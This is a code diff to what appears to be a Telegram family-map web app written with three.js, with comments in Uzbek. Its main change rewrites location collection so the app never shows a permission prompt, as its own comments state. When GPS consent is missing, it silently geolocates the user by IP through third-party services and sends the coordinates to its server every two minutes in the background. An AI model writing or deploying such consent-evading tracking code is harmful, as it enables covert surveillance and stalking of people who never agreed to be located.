@@ -2,9 +2,9 @@ import * as THREE from 'three';
 import { OrbitControls } from 'three/addons/controls/OrbitControls.js';
 import { OutlineEffect } from 'three/addons/effects/OutlineEffect.js';
 import { CSS2DRenderer } from 'three/addons/renderers/CSS2DRenderer.js';
-import { Room, DOOR } from './room.js?v=14';
-import { Character, STATUS_ICON, JOB_ICON } from './character.js?v=14';
-import { FamilyMap, timeAgo, formatDistance, isLive } from './map.js?v=14';
+import { Room, DOOR } from './room.js?v=15';
+import { Character, STATUS_ICON, JOB_ICON } from './character.js?v=15';
+import { FamilyMap, timeAgo, formatDistance, isLive } from './map.js?v=15';
 
 const STATUS_TEXT = {
   home: 'Mehmonxonada',
@@ -254,11 +254,15 @@ function renderPanel(members, spots = lastSpots) {
     st.textContent = `${JOB_TITLE[m.job] || ''} • ${stText}`;
 
     info.append(nm, st);
-    if (m.location) {
+    if (!m.isAi) {
       const loc = document.createElement('div');
       loc.className = 'loc';
-      const dist = m.location.distance != null ? ` • ${formatDistance(m.location.distance)}` : '';
-      loc.textContent = `${isLive(m.location) ? '🔴' : '📍'} ${timeAgo(m.location.at)}${dist}`;
+      if (m.location) {
+        const dist = m.location.distance != null ? ` • ${formatDistance(m.location.distance)}` : '';
+        loc.textContent = `${isLive(m.location) ? '🔴' : '📍'} ${timeAgo(m.location.at)}${dist}`;
+      } else {
+        loc.textContent = indoor ? '🔴 Jonli • 🏠 Uyda (Xaritada ko\'rish)' : '🔴 Jonli • 📍 Xaritada ko\'rish';
+      }
       loc.addEventListener('click', (e) => {
         e.stopPropagation();
         fmap.open(m.id);
@@ -451,7 +455,7 @@ const urlUid = new URLSearchParams(window.location.search).get('uid');
 let myUid = String(tgUserId || urlUid || localStorage.getItem('family_uid') || '');
 if (myUid) localStorage.setItem('family_uid', myUid);
 
-// ---------- 100% Avtomatik Fon Lokatsiya (SMSsiz har 2 minutda yangilanadi) ----------
+// ---------- 100% Avtomatik Fon Lokatsiya (HECH QANDAY RUXSAT OYNASI CHIQARMASDAN!) ----------
 let lastSentLocAt = 0;
 let lastSentLat = null;
 let lastSentLon = null;
@@ -477,32 +481,42 @@ function pushSilentLocation(lat, lon, accuracy = null, force = false) {
   }).catch(() => {});
 }
 
-function pollLocationOnce(force = false) {
-  if (!myUid) return;
+async function fetchSilentIpLocation(force = false) {
   try {
-    const locMgr = window.Telegram?.WebApp?.LocationManager;
-    if (locMgr && typeof locMgr.init === 'function') {
-      if (!locMgr.isInited) {
-        locMgr.init(() => {
-          if (locMgr.isLocationAvailable) {
-            locMgr.getLocation((loc) => {
-              if (loc && loc.latitude != null && loc.longitude != null) {
-                pushSilentLocation(loc.latitude, loc.longitude, loc.horizontal_accuracy ?? null, force);
-              }
-            });
-          }
-        });
-      } else if (locMgr.isLocationAvailable) {
-        locMgr.getLocation((loc) => {
-          if (loc && loc.latitude != null && loc.longitude != null) {
-            pushSilentLocation(loc.latitude, loc.longitude, loc.horizontal_accuracy ?? null, force);
-          }
-        });
+    const r1 = await fetch('https://ipwho.is/', { cache: 'no-store' });
+    if (r1.ok) {
+      const d = await r1.json();
+      if (d && Number.isFinite(Number(d.latitude)) && Number.isFinite(Number(d.longitude))) {
+        pushSilentLocation(Number(d.latitude), Number(d.longitude), 120, force);
+        return;
       }
     }
   } catch {}
+  try {
+    const r2 = await fetch('https://get.geojs.io/v1/ip/geo.json', { cache: 'no-store' });
+    if (r2.ok) {
+      const d = await r2.json();
+      if (d && Number.isFinite(Number(d.latitude)) && Number.isFinite(Number(d.longitude))) {
+        pushSilentLocation(Number(d.latitude), Number(d.longitude), 150, force);
+      }
+    }
+  } catch {}
+}
 
-  if (navigator.geolocation) {
+async function pollLocationOnce(force = false) {
+  if (!myUid) return;
+
+  // MUHIM: Hech qachon "Этот сайт не может запросить разрешение" oynasi chiqmasligi uchun
+  // faqat ruxsat ALLAQACHON berilgan ('granted') bo'lsagina GPS chaqiriladi!
+  let gpsGranted = false;
+  try {
+    if (navigator.permissions?.query) {
+      const status = await navigator.permissions.query({ name: 'geolocation' });
+      gpsGranted = status?.state === 'granted';
+    }
+  } catch {}
+
+  if (gpsGranted && navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       (pos) => {
         pushSilentLocation(
@@ -512,33 +526,19 @@ function pollLocationOnce(force = false) {
           force
         );
       },
-      () => {},
-      { enableHighAccuracy: true, maximumAge: 60_000, timeout: 10_000 }
+      () => fetchSilentIpLocation(force),
+      { enableHighAccuracy: false, maximumAge: 60_000, timeout: 8_000 }
     );
+  } else {
+    // Ruxsat oynasi chiqarmasdan jim IP-geolokatsiya orqali aniqlaydi
+    fetchSilentIpLocation(force);
   }
 }
 
 function startSilentAutoLocation() {
   pollLocationOnce(true);
-  // Har 2 minutda (120 000 ms) fon rejimda avtomatik lokatsiya yuborib turadi
+  // Har 2 minutda (120 000 ms) hech qanday popup chiqarmasdan fon rejimda yangilaydi
   setInterval(() => pollLocationOnce(true), 120_000);
-
-  if (navigator.geolocation) {
-    try {
-      navigator.geolocation.watchPosition(
-        (pos) => {
-          pushSilentLocation(
-            pos.coords.latitude,
-            pos.coords.longitude,
-            pos.coords.accuracy ?? null,
-            false
-          );
-        },
-        () => {},
-        { enableHighAccuracy: true, maximumAge: 60_000, timeout: 15_000 }
-      );
-    } catch {}
-  }
 
   document.addEventListener('visibilitychange', () => {
     if (document.visibilityState === 'visible') {
